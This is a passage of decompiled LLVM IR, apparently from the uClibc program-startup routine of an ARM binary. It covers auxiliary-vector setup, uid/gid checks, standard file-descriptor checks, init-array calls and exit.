  store i32 %arg6, i32* %v4_1156056, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1156c = load i32, i32* %r3.global-to-local, align 4
  %v2_1156c = load i32, i32* %r4.global-to-local, align 4
  %v3_1156c = inttoptr i32 %v2_1156c to i32*
  store i32 %v1_1156c, i32* %v3_1156c, align 4
  br label %bb82

bb82:                                             ; preds = %.thread57, %bb81
  %v2_11570 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_11570, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_11578 = bitcast i32* %stack_var_-120 to i8*
  %v4_11578 = call i32 @__GI_memset(i8* %v3_11578, i32 0, i32 120)
  store i32 %v4_11578, i32* %r0.global-to-local, align 4
  %v0_1157c = load i32, i32* %r4.global-to-local, align 4
  %v1_1157c = inttoptr i32 %v0_1157c to i32*
  %v2_1157c = load i32, i32* %v1_1157c, align 4
  br label %dec_label_pc_11588

dec_label_pc_11588:                               ; preds = %dec_label_pc_11588, %bb82
  %storemerge = phi i32 [ %v2_1157c, %bb82 ], [ %v1_11594, %dec_label_pc_11588 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_11588 = inttoptr i32 %storemerge to i32*
  %v2_11588 = load i32, i32* %v1_11588, align 4
  store i32 %v2_11588, i32* %r3.global-to-local, align 4
  %v2_1158c = icmp eq i32 %v2_11588, 0
  %v1_11594 = add i32 %storemerge, 4
  br i1 %v2_1158c, label %dec_label_pc_11594, label %dec_label_pc_11588

dec_label_pc_11594:                               ; preds = %dec_label_pc_11588
  store i32 %v1_11594, i32* @r4, align 4
  store i32 %v2_11570, i32* @r5, align 4
  %v1_115b835 = inttoptr i32 %v1_11594 to i32*
  %v2_115b836 = load i32, i32* %v1_115b835, align 4
  store i32 %v2_115b836, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_115bc38 = icmp eq i32 %v2_115b836, 0
  store i1 %v2_115bc38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115bc38, label %dec_label_pc_115c4, label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11594, %dec_label_pc_115b8
  %v4_115a8 = phi i32 [ %v1_115b4, %dec_label_pc_115b8 ], [ %v1_11594, %dec_label_pc_11594 ]
  %v5_115a4 = phi i32 [ %v2_115b8, %dec_label_pc_115b8 ], [ %v2_115b836, %dec_label_pc_11594 ]
  %v2_115a0 = icmp ugt i32 %v5_115a4, 13
  store i1 %v2_115a0, i1* %cpsr_c.global-to-local, align 1
  %v7_115a0 = icmp eq i32 %v5_115a4, 14
  store i1 %v7_115a0, i1* %cpsr_z.global-to-local, align 1
  %v2_115a4 = xor i1 %v2_115a0, true
  %v3_115a4 = or i1 %v7_115a0, %v2_115a4
  br i1 %v3_115a4, label %bb83, label %bb84

bb83:                                             ; preds = %dec_label_pc_115a0
  %v4_115a4 = load i32, i32* @r5, align 4
  %v6_115a4 = and i32 %v5_115a4, 536870912
  %v7_115a4 = icmp ne i32 %v6_115a4, 0
  store i1 %v7_115a4, i1* %cpsr_c.global-to-local, align 1
  %v8_115a4 = mul i32 %v5_115a4, 8
  %v9_115a4 = add i32 %v4_115a4, %v8_115a4
  store i32 %v9_115a4, i32* %r0.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_115a0, %bb83
  %v1_115b0 = phi i1 [ %v2_115a0, %dec_label_pc_115a0 ], [ %v7_115a4, %bb83 ]
  %v2_115a8 = xor i1 %v1_115b0, true
  %v3_115a8 = or i1 %v7_115a0, %v2_115a8
  br i1 %v3_115a8, label %bb85, label %dec_label_pc_115b8

bb85:                                             ; preds = %bb84
  store i32 %v4_115a8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115b8

dec_label_pc_115b8:                               ; preds = %bb84, %bb85
  call void @__pseudo_cond_branch(i1 %v3_115a8, i32 ptrtoint (i32* @global_var_d8b0.471 to i32))
  %v0_115b4 = load i32, i32* @r4, align 4
  %v1_115b4 = add i32 %v0_115b4, 8
  store i32 %v1_115b4, i32* @r4, align 4
  %v1_115b8 = inttoptr i32 %v1_115b4 to i32*
  %v2_115b8 = load i32, i32* %v1_115b8, align 4
  store i32 %v2_115b8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_115bc = icmp eq i32 %v2_115b8, 0
  store i1 %v2_115bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115bc, label %dec_label_pc_115c4, label %dec_label_pc_115a0

dec_label_pc_115c4:                               ; preds = %dec_label_pc_115b8, %dec_label_pc_11594
  store i32 %v2_11570, i32* %r0.global-to-local, align 4
  %v1_115c8 = call i32 @_dl_aux_init(i32 %v2_11570)
  store i32 %v1_115c8, i32* %r0.global-to-local, align 4
  %v1_115cc = call i32 @__GI___uClibc_init(i32 %v1_115c8)
  store i32 %v1_115cc, i32* @r0, align 4
  store i32 156, i32* %r3.global-to-local, align 4
  %v2_115d4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_115d4, i32* @lr, align 4
  store i32 %tmp71, i32* @r2, align 4
  %v2_115dc = add i32 %v2_115d4, 156
  %v3_115dc = inttoptr i32 %v2_115dc to i32*
  %v4_115dc = load i32, i32* %v3_115dc, align 4
  store i32 %v4_115dc, i32* %r1.global-to-local, align 4
  store i32 %tmp70, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_115e4 = icmp eq i32 %tmp71, 0
  store i1 %v2_115e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115e4, label %bb86, label %bb87

bb86:                                             ; preds = %dec_label_pc_115c4
  store i32 4096, i32* @r2, align 4
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_115c4, %bb86
  %v0_115f0 = phi i32 [ %tmp71, %dec_label_pc_115c4 ], [ 4096, %bb86 ]
  %v3_115ec = icmp eq i32 %tmp70, -1
  store i1 %v3_115ec, i1* %cpsr_c.global-to-local, align 1
  %v8_115ec = icmp eq i32 %tmp70, -1
  store i1 %v8_115ec, i1* %cpsr_z.global-to-local, align 1
  %v2_115f0 = inttoptr i32 %v4_115dc to i32*
  store i32 %v0_115f0, i32* %v2_115f0, align 4
  br i1 %v3_115ec, label %dec_label_pc_115f8, label %dec_label_pc_11620

dec_label_pc_115f8:                               ; preds = %bb87
  %v0_115f8 = call i32 @getuid()
  store i32 %v0_115f8, i32* @r0, align 4
  store i32 %v0_115f8, i32* %r4.global-to-local, align 4
  %v0_11600 = call i32 @geteuid()
  store i32 %v0_11600, i32* @r0, align 4
  %v3_11604 = icmp uge i32 %v0_115f8, %v0_11600
  store i1 %v3_11604, i1* %cpsr_c.global-to-local, align 1
  %v9_11604 = icmp eq i32 %v0_115f8, %v0_11600
  store i1 %v9_11604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11604, label %dec_label_pc_1160c, label %dec_label_pc_11648

dec_label_pc_1160c:                               ; preds = %dec_label_pc_115f8
  %v1_1160c = call i32 @getgid(i32 %v0_11600)
  store i32 %v1_1160c, i32* @r0, align 4
  store i32 %v1_1160c, i32* %r4.global-to-local, align 4
  %v0_11614 = call i32 @getegid()
  store i32 %v0_11614, i32* %r0.global-to-local, align 4
  %v3_11618 = icmp uge i32 %v1_1160c, %v0_11614
  store i1 %v3_11618, i1* %cpsr_c.global-to-local, align 1
  %v9_11618 = icmp eq i32 %v1_1160c, %v0_11614
  store i1 %v9_11618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11618, label %dec_label_pc_11620, label %dec_label_pc_11648

dec_label_pc_11620:                               ; preds = %dec_label_pc_1160c, %bb87
  store i32 %tmp70, i32* @r2, align 4
  store i1 %v3_115ec, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_115ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_115ec, label %dec_label_pc_11670, label %dec_label_pc_1162c

dec_label_pc_1162c:                               ; preds = %dec_label_pc_11620
  store i32 %tmp69, i32* @r3, align 4
  %v3_11630 = icmp uge i32 %tmp70, %tmp69
  store i1 %v3_11630, i1* %cpsr_c.global-to-local, align 1
  %v9_11630 = icmp eq i32 %tmp70, %tmp69
  store i1 %v9_11630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11630, label %dec_label_pc_11638, label %dec_label_pc_11648

dec_label_pc_11638:                               ; preds = %dec_label_pc_1162c
  store i32 %tmp68, i32* @r2, align 4
  store i32 %tmp67, i32* @r3, align 4
  %v3_11640 = icmp uge i32 %tmp68, %tmp67
  store i1 %v3_11640, i1* %cpsr_c.global-to-local, align 1
  %v9_11640 = icmp eq i32 %tmp68, %tmp67
  store i1 %v9_11640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11640, label %dec_label_pc_11670, label %dec_label_pc_11648

dec_label_pc_11648:                               ; preds = %dec_label_pc_1162c, %dec_label_pc_1160c, %dec_label_pc_115f8, %dec_label_pc_11638
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_11654 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1165c = load i32, i32* @r4, align 4
  store i32 %v0_1165c, i32* %r1.global-to-local, align 4
  %v2_11660 = call i32 @__check_one_fd(i32 1, i32 %v0_1165c)
  %v0_11664 = load i32, i32* @r4, align 4
  store i32 %v0_11664, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1166c = call i32 @__check_one_fd(i32 2, i32 %v0_11664)
  store i32 %v2_1166c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11670

dec_label_pc_11670:                               ; preds = %dec_label_pc_11638, %dec_label_pc_11620, %dec_label_pc_11648
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 784, i32* %r3.global-to-local, align 4
  %v2_11678 = load i32, i32* %v1_11510, align 4
  store i32 %v2_11678, i32* %r2.global-to-local, align 4
  %v2_1167c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1167c, i32* %r1.global-to-local, align 4
  %v3_11680 = add i32 %v2_1167c, 784
  %v4_11680 = inttoptr i32 %v3_11680 to i32*
  store i32 %v2_11678, i32* %v4_11680, align 4
  %v0_11684 = load i32, i32* %r0.global-to-local, align 4
  %v1_11684 = inttoptr i32 %v0_11684 to i32*
  %v2_11684 = load i32, i32* %v1_11684, align 4
  store i32 %v2_11684, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11688 = icmp eq i32 %v2_11684, 0
  store i1 %v2_11688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11688, label %bb89, label %dec_label_pc_11690

dec_label_pc_11690:                               ; preds = %dec_label_pc_11670
  store i32 172, i32* %r3.global-to-local, align 4
  %v0_11694 = load i32, i32* %r1.global-to-local, align 4
  %v2_11694 = add i32 %v0_11694, 172
  %v3_11694 = inttoptr i32 %v2_11694 to i32*
  %v4_11694 = load i32, i32* %v3_11694, align 4
  store i32 %v4_11694, i32* %r3.global-to-local, align 4
  %v2_11698 = inttoptr i32 %v4_11694 to i32*
  store i32 %v2_11684, i32* %v2_11698, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_116a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_116a0 = inttoptr i32 %v0_116a0 to i32*
  %v2_116a0 = load i32, i32* %v1_116a0, align 4
  store i32 %v2_116a0, i32* %r0.global-to-local, align 4
  %v4_116a4 = call i32 @__GI_strrchr(i32 %v2_116a0, i32 47, i32 %v2_11678, i32 %v4_11694)
  store i32 %v4_116a4, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_116ac = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_116ac, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116b0 = icmp eq i32 %v4_116a4, 0
  store i1 %v2_116b0, i1* %cpsr_z.global-to-local, align 1
  %v2_116b4 = add i32 %v2_116ac, 104
  %v3_116b4 = inttoptr i32 %v2_116b4 to i32*
  %v4_116b4 = load i32, i32* %v3_116b4, align 4
  store i32 %v4_116b4, i32* %r2.global-to-local, align 4
  br i1 %v2_116b0, label %.thread62, label %bb88

.thread62:                                        ; preds = %dec_label_pc_11690
  %v2_116bc63 = inttoptr i32 %v4_116b4 to i32*
  store i32 0, i32* %v2_116bc63, align 4
  br label %bb89

bb88:                                             ; preds = %dec_label_pc_11690
  %v2_116b8 = add i32 %v4_116a4, 1
  store i32 %v2_116b8, i32* %r3.global-to-local, align 4
  %v2_116bc = inttoptr i32 %v4_116b4 to i32*
  store i32 %v4_116a4, i32* %v2_116bc, align 4
  %v1_116c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_116c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_116c0 = inttoptr i32 %v2_116c0 to i32*
  store i32 %v1_116c0, i32* %v3_116c0, align 4
  br label %bb89

bb89:                                             ; preds = %.thread62, %bb88, %dec_label_pc_11670
  %v2_116d0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_116d0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_116dc = add i32 %v2_116d0, -12
  store i32 %v2_116dc, i32* %r5.global-to-local, align 4
  store i32 11968, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_116ec = add i32 %v2_116d0, 11968
  %v4_116ec = inttoptr i32 %v3_116ec to i32*
  store i32 %arg5, i32* %v4_116ec, align 4
  %v0_1170423 = load i32, i32* %r4.global-to-local, align 4
  %v1_1170424 = load i32, i32* %r7.global-to-local, align 4
  %v3_1170426 = icmp uge i32 %v0_1170423, %v1_1170424
  store i1 %v3_1170426, i1* %cpsr_c.global-to-local, align 1
  %v9_1170432 = icmp eq i32 %v0_1170423, %v1_1170424
  store i1 %v9_1170432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1170426, label %dec_label_pc_11738.lr.ph, label %dec_label_pc_116f4

dec_label_pc_116f4:                               ; preds = %bb89, %dec_label_pc_116f4
  %v1_116f4 = phi i32 [ %v1_11700, %dec_label_pc_116f4 ], [ %v0_1170423, %bb89 ]
  %v0_116f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_116f4 = and i32 %v1_116f4, 1073741824
  %v3_116f4 = icmp ne i32 %v2_116f4, 0
  store i1 %v3_116f4, i1* %cpsr_c.global-to-local, align 1
  %v4_116f4 = mul i32 %v1_116f4, 4
  %v5_116f4 = add i32 %v4_116f4, %v0_116f4
  %v6_116f4 = inttoptr i32 %v5_116f4 to i32*
  %v7_116f4 = load i32, i32* %v6_116f4, align 4
  store i32 %v7_116f4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_116f4)
  %v0_11700 = load i32, i32* %r4.global-to-local, align 4
  %v1_11700 = add i32 %v0_11700, 1
  store i32 %v1_11700, i32* %r4.global-to-local, align 4
  %v1_11704 = load i32, i32* %r7.global-to-local, align 4
  %v3_11704 = icmp uge i32 %v1_11700, %v1_11704
  store i1 %v3_11704, i1* %cpsr_c.global-to-local, align 1
  %v9_11704 = icmp eq i32 %v1_11700, %v1_11704
  store i1 %v9_11704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11704, label %dec_label_pc_11738.lr.ph, label %dec_label_pc_116f4

dec_label_pc_11738.lr.ph:                         ; preds = %dec_label_pc_116f4, %bb89
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1170c = icmp eq i32 %v0_11558, 0
  store i1 %v2_1170c, i1* %cpsr_z.global-to-local, align 1
  %v2_11714 = xor i1 %v2_1170c, true
  call void @__pseudo_cond_branch(i1 %v2_11714, i32 %v0_11558)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_11720 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1172c = add i32 %v2_11720, -12
  store i32 %v2_1172c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11738

dec_label_pc_11738:                               ; preds = %dec_label_pc_11738.dec_label_pc_11738_crit_edge, %dec_label_pc_11738.lr.ph
  %v1_11738 = phi i32 [ %v1_11744, %dec_label_pc_11738.dec_label_pc_11738_crit_edge ], [ 0, %dec_label_pc_11738.lr.ph ]
  %v0_11738 = phi i32 [ %v0_11738.pre, %dec_label_pc_11738.dec_label_pc_11738_crit_edge ], [ %v2_1172c, %dec_label_pc_11738.lr.ph ]
  %v2_11738 = and i32 %v1_11738, 1073741824
  %v3_11738 = icmp ne i32 %v2_11738, 0
  store i1 %v3_11738, i1* %cpsr_c.global-to-local, align 1
  %v4_11738 = mul i32 %v1_11738, 4
  %v5_11738 = add i32 %v4_11738, %v0_11738
  %v6_11738 = inttoptr i32 %v5_11738 to i32*
  %v7_11738 = load i32, i32* %v6_11738, align 4
  store i32 %v7_11738, i32* %ip.global-to-local, align 4
  store i32 71492, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_11738)
  %v0_11744 = load i32, i32* @r4, align 4
  %v1_11744 = add i32 %v0_11744, 1
  store i32 %v1_11744, i32* @r4, align 4
  %v1_11748 = load i32, i32* @r7, align 4
  %v3_11748 = icmp uge i32 %v1_11744, %v1_11748
  store i1 %v3_11748, i1* %cpsr_c.global-to-local, align 1
  %v9_11748 = icmp eq i32 %v1_11744, %v1_11748
  store i1 %v9_11748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11748, label %dec_label_pc_11750, label %dec_label_pc_11738.dec_label_pc_11738_crit_edge

dec_label_pc_11738.dec_label_pc_11738_crit_edge:  ; preds = %dec_label_pc_11738
  %v0_11738.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11738

dec_label_pc_11750:                               ; preds = %dec_label_pc_11738
  %v2_11754.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_11754.pre, i32* %r0.global-to-local, align 4
  %v2_11758 = add i32 %v2_11754.pre, -98012
  store i32 %v2_11758, i32* %r2.global-to-local, align 4
  store i32 %v2_11758, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11760 = icmp eq i32 %v2_11758, 0
  store i1 %v2_11760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11760, label %dec_label_pc_11778, label %dec_label_pc_11768

dec_label_pc_11768:                               ; preds = %dec_label_pc_11750
  store i32 71536, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_11758)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_11774 = load i32, i32* %r0.global-to-local, align 4
  %v2_11774 = inttoptr i32 %v1_11774 to i32*
  store i32 0, i32* %v2_11774, align 4
  %v2_1177c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_11778

dec_label_pc_11778:                               ; preds = %dec_label_pc_11750, %dec_label_pc_11768
  %v2_1177c = phi i32 [ %v2_11754.pre, %dec_label_pc_11750 ], [ %v2_1177c.pre, %dec_label_pc_11768 ]
  store i32 136, i32* %r3.global-to-local, align 4
  store i32 %v2_1177c, i32* %r1.global-to-local, align 4
  %v2_11780 = add i32 %v2_1177c, 136
  %v3_11780 = inttoptr i32 %v2_11780 to i32*
  %v4_11780 = load i32, i32* %v3_11780, align 4
  store i32 %v4_11780, i32* %r2.global-to-local, align 4
  store i32 %v4_11780, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11788 = icmp eq i32 %v4_11780, 0
  store i1 %v2_11788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11788, label %dec_label_pc_117a0, label %dec_label_pc_11790

dec_label_pc_11790:                               ; preds = %dec_label_pc_11778
  store i32 71576, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11780)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1179c = load i32, i32* %r0.global-to-local, align 4
  %v2_1179c = inttoptr i32 %v1_1179c to i32*
  store i32 0, i32* %v2_1179c, align 4
  br label %dec_label_pc_117a0

dec_label_pc_117a0:                               ; preds = %dec_label_pc_11778, %dec_label_pc_11790
  %v2_117a0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_117a0, i32* @r0, align 4
  %v1_117a4 = call i32 @_setjmp(i32 %v2_117a0)
  store i32 %v1_117a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_117a8 = icmp eq i32 %v1_117a4, 0
  store i1 %v2_117a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117a8, label %dec_label_pc_117b0, label %dec_label_pc_117fc

dec_label_pc_117b0:                               ; preds = %dec_label_pc_117a0
  %v0_117b0 = call i32 @__aeabi_read_tp()
  store i32 %v0_117b0, i32* %r0.global-to-local, align 4
  %v1_117b4 = add i32 %v0_117b0, -1168
  store i32 %v1_117b4, i32* %r2.global-to-local, align 4
  %v2_117bc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_117bc, i32* %r4.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_117c8 = add i32 %v2_117bc, 60
  %v3_117c8 = inttoptr i32 %v2_117c8 to i32*
  %v4_117c8 = load i32, i32* %v3_117c8, align 4
  store i32 %v4_117c8, i32* %ip.global-to-local, align 4
  store i32 %v2_117a0, i32* %r3.global-to-local, align 4
  %v2_117d8 = add i32 %v0_117b0, -1040
  %v3_117d8 = inttoptr i32 %v2_117d8 to i32*
  store i32 %v2_117a0, i32* %v3_117d8, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_117e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_117e4 = inttoptr i32 %v0_117e4 to i32*
  %v2_117e4 = load i32, i32* %v1_117e4, align 4
  store i32 %v2_117e4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_117f4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11898

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117a0
  store i32 44, i32* %r3.global-to-local, align 4
  %v2_11800 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_11800, i32* %ip.global-to-local, align 4
  %v2_11804 = add i32 %v2_11800, 44
  %v3_11804 = inttoptr i32 %v2_11804 to i32*
  %v4_11804 = load i32, i32* %v3_11804, align 4
  store i32 %v4_11804, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11804)
  store i32 128, i32* %r3.global-to-local, align 4
  %v2_11814 = load i32, i32* %stack_var_-416, align 4
  %v2_11818 = add i32 %v2_11814, 128
  %v3_11818 = inttoptr i32 %v2_11818 to i32*
  %v4_11818 = load i32, i32* %v3_11818, align 4
  store i32 %v4_11818, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1181c

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11850.dec_label_pc_1181c_crit_edge, %dec_label_pc_117fc
  %v0_1181c = phi i32 [ %v0_1181c.pre, %dec_label_pc_11850.dec_label_pc_1181c_crit_edge ], [ %v4_11818, %dec_label_pc_117fc ]
  %v1_1181c = inttoptr i32 %v0_1181c to i32*
  %v2_1181c = load i32, i32* %v1_1181c, align 4
  store i32 %v0_1181c, i32* %r2.global-to-local, align 4
  store i32 %v2_1181c, i32* %r4.global-to-local, align 4
  %v1_11828 = add i32 %v2_1181c, -1
  store i32 %v1_11828, i32* %r1.global-to-local, align 4
  %v2_1182c94 = load i32, i32* %v1_1181c, align 4
  store i32 %v2_1182c94, i32* %r3.global-to-local, align 4
  %v3_1183096 = icmp uge i32 %v2_1182c94, %v2_1181c
  store i1 %v3_1183096, i1* %cpsr_c.global-to-local, align 1
  %v9_11830102 = icmp eq i32 %v2_1182c94, %v2_1181c
  store i1 %v9_11830102, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11830102, label %dec_label_pc_11838, label %dec_label_pc_11850

dec_label_pc_11838:                               ; preds = %dec_label_pc_1181c, %dec_label_pc_11838.dec_label_pc_1182c_crit_edge
  %v0_11838103 = phi i32 [ %v1_11830.pre, %dec_label_pc_11838.dec_label_pc_1182c_crit_edge ], [ %v2_1181c, %dec_label_pc_1181c ]
  store i32 %v0_11838103, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_11848 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11848, label %dec_label_pc_1184c, label %dec_label_pc_11838.dec_label_pc_1182c_crit_edge

dec_label_pc_11838.dec_label_pc_1182c_crit_edge:  ; preds = %dec_label_pc_11838
  %v0_1182c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11830.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1182c = inttoptr i32 %v0_1182c.pre to i32*
  %v2_1182c = load i32, i32* %v1_1182c, align 4
  store i32 %v2_1182c, i32* %r3.global-to-local, align 4
  %v3_11830 = icmp uge i32 %v2_1182c, %v1_11830.pre
  store i1 %v3_11830, i1* %cpsr_c.global-to-local, align 1
  %v9_11830 = icmp eq i32 %v2_1182c, %v1_11830.pre
  store i1 %v9_11830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11830, label %dec_label_pc_11838, label %dec_label_pc_11850

dec_label_pc_1184c:                               ; preds = %dec_label_pc_11838
  %v0_1184c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1184c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11850

dec_label_pc_11850:                               ; preds = %dec_label_pc_1181c, %dec_label_pc_11838.dec_label_pc_1182c_crit_edge, %dec_label_pc_1184c
  %v0_11858 = phi i32 [ %v0_1184c, %dec_label_pc_1184c ], [ %v2_1182c94, %dec_label_pc_1181c ], [ %v2_1182c, %dec_label_pc_11838.dec_label_pc_1182c_crit_edge ]
  %v1_11850 = phi i32 [ %v0_1184c, %dec_label_pc_1184c ], [ %v2_1181c, %dec_label_pc_1181c ], [ %v1_11830.pre, %dec_label_pc_11838.dec_label_pc_1182c_crit_edge ]
  %v3_11850 = icmp uge i32 %v0_11858, %v1_11850
  store i1 %v3_11850, i1* %cpsr_c.global-to-local, align 1
  %v9_11850 = icmp eq i32 %v0_11858, %v1_11850
  store i1 %v9_11850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11850, label %dec_label_pc_11858, label %dec_label_pc_11850.dec_label_pc_1181c_crit_edge

dec_label_pc_11850.dec_label_pc_1181c_crit_edge:  ; preds = %dec_label_pc_11850
  %v0_1181c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1181c

dec_label_pc_11858:                               ; preds = %dec_label_pc_11850
  %v2_11858 = icmp ne i32 %v1_11850, 0
  store i1 %v2_11858, i1* %cpsr_c.global-to-local, align 1
  %v7_11858 = icmp eq i32 %v1_11850, 1
  store i1 %v7_11858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11858, label %dec_label_pc_11898, label %dec_label_pc_11860

dec_label_pc_11860:                               ; preds = %dec_label_pc_11858
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11898

dec_label_pc_11898:                               ; preds = %dec_label_pc_11858, %dec_label_pc_11860, %dec_label_pc_117b0
  %storemerge3 = phi i32 [ %v0_117f4, %dec_label_pc_117b0 ], [ 0, %dec_label_pc_11860 ], [ 0, %dec_label_pc_11858 ]
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r0.global-to-local, align 4
  %v2_1189c = call i32 @__GI_exit(i32 %storemerge3)
  store i32 %v2_1189c, i32* %r0.global-to-local, align 4
  %v0_118a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_118a0, label %bb90, label %.thread14

bb90:                                             ; preds = %dec_label_pc_11898
  %v1_118a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_118a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_118a0 = udiv i32 %v2_118a0, 8388608
  %v4_118a0 = mul i32 %v2_118a0, 512
  %v5_118a0 = or i32 %v3_118a0, %v4_118a0
  %v8_118a0 = and i32 %v5_118a0, %v1_118a0
  %v2_118a8 = load i32, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_118e8 = inttoptr i32 %v8_118a0 to i64*
  %v3_118e8 = load i64, i64* %v2_118e8, align 4
  %v5_118e8 = trunc i64 %v3_118e8 to i32
  %v6_118e8 = udiv i64 %v3_118e8, 4294967296
  %v7_118e8 = trunc i64 %v6_118e8 to i32
  store i32 %v5_118e8, i32* %r2.global-to-local, align 4
  %v9_118e8 = sub i32 %v7_118e8, %v2_118a8
  store i32 %v9_118e8, i32* %r1.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_11898, %bb90
  %v10_118e8 = phi i32 [ %v2_1189c, %dec_label_pc_11898 ], [ 0, %bb90 ]
  ret i32 %v10_118e8

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0, 2 }
